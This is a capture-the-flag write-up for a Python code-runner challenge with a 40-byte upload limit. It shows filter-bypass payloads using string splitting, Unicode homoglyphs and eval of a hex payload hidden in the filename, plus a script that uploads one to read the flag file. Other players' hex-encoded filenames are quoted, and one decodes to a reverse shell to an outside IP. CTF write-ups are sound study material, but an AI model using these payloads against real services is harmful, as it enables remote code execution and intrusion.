# van_rizzum

Skibido van Rizzum liker å laste opp korte Python-programmer på webserveren sin, hvor de så blir kjørt og returnerer output tilbake til nettleseren. Veldig kjekt når man sitter og programmerer på en enhet hvor Python ikke er installert!

Han har åpnet for hvem som helst å kjøre programmer, men for å hindre at noen finner og leser det hemmelige flagget som ligger i fila `/very/long/path/to/a/secret/document/with/the/unoriginal/name/flag.txt` har han passet på at man ikke kan laste opp programmer som er lengre enn 40 bytes.

http://206.189.63.87/upload-python

# Writeup

Tried a inline import and system:

```python
__import__('os').system('cat /v*/*/f*')
```

That gave me `exec og import er fa'li'` and adding just the text `exec` and `import` seems to be banned. So I tried bypassing that:

```python
eval('__impor'+'t__("os").system("id")')
```

That gave me `uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)`. But that was all 40 characters. So I need to shorten this a lot. I tried unicode as Python normalizes unicodes. Based on this [website](https://gosecure.github.io/unicode-pentester-cheatsheet/) I can use `ｉ` instead of `i` and `ｍ` instead of `m`. 

```python
𝘦xec("impor"+"t os")
os.system("id")
```

This worked as well. 

```python
__ℹmport__("os").system("cat /**/f*")
```

This i think broke the challenge, got 502 bad gateway :/ and it seems not to recover. so hard crash? After a while Tormod fixed it and I could continue.

Now I tried many hours different methods of reading files. I figured out my scripts were uploaded into `/tmp/<randomchars>/solve.py`. But I did not come any further. Took a trip to Dinosaur World and when I got back I thought: What about snooping at what other people did? So I tried:

```python
__ℹmport__("os").system("cat ../*/*")
```

And here is a few things that popped out:

```python
help()eval(bytes.fromhex(__file__[70:]))
eval(bytes.fromhex(__file__[70:]))
help()eval(bytes.fromhex(__file__[70:]))
eval(bytes.fromhex(__file__[70:]))
eval(bytes.fromhex(__file__[70:]))
__ℹmport__("os").system("cat ../*/*")
__ℹmport__("os").system("od /**/*")help('modules')__ℹmport__("os").system("cat /**/f*")eval(bytes.fromhex(__file__[70:]))
eval(bytes.fromhex(__file__[70:]))
eval("__im"+"port__('os').system('sh')")eval(bytes.fromhex(__file__[70:]))a = input(">>");print(a)
print(open("/proc/self/fd/0").read())a=input(">>>");print(a)
__imporｔ__('os').system(__file__[70:])__ℹmport__("os").system("cat /**//*")
```

I did not really understand anything until I did a "ls ../*/*" and saw the filenames of some of them:

```bash
18727c92ea67643cc35eac2839d4074313fcdc74ce3432844b22db082c9c0142/solve
../18ff25358af38c70af2fce3253501b849bdfef6f83b69f82d562ee1a6998b2f6/test
../196d000758072c713f2710ac840d5441381bc9e931efd625ce31fc58d028d1af/cat
../1f4dafb905ec2ae5ab5bb19ecbe63c99003b64f467d9d86bc46ad9ac51e76040/solve
../223339eba13c003b4385701412fc6e053a7fc6bed420f5827e80907ac4caa27c/5f5f696d706f72745f5f282773756270726f6365737327292e506f70656e285b27707974686f6e33272c272d6d272c27687474702e736572766572272c2738303830272c272d64272c272f275d29
../260ecfb56d56e01d2c3d31f7831d67bb24004579cbf972f2ed052e20107e1984/solve
../26d87e36023d6f73e001825924114c08db9366566185ff2a78751e222830f171/5f5f696d706f72745f5f28226f7322292e73797374656d282762617368202d6320227368202d69203e26202f6465762f7463702f35312e3139352e39312e37362f333133333720303e2631222729
```

So they basically did use the filename as additional payload! Genious! It seems like they did reverse shell but I made this instead:

```python
import requests

script = "print(open('/very/long/path/to/a/secret/document/with/the/unoriginal/name/flag.txt').read())"
script_hex = script.encode().hex()
eval_script = "eval(bytes.fromhex(__file__[70:]))"

# Save eval to script_hex filename
with open(script_hex, "w") as f:
    f.write(eval_script)
    f.close()

url = "http://206.189.63.87/run-python"
files = {'f': open(script_hex, 'rb')}
r = requests.post(url, files=files)
print(r.text)
```

This script will create a file with the eval script and then run it. And it worked! Got the flag!


# Flag

```
helsectf{finnes_det_flere_l0sninger_enn_intended?}
```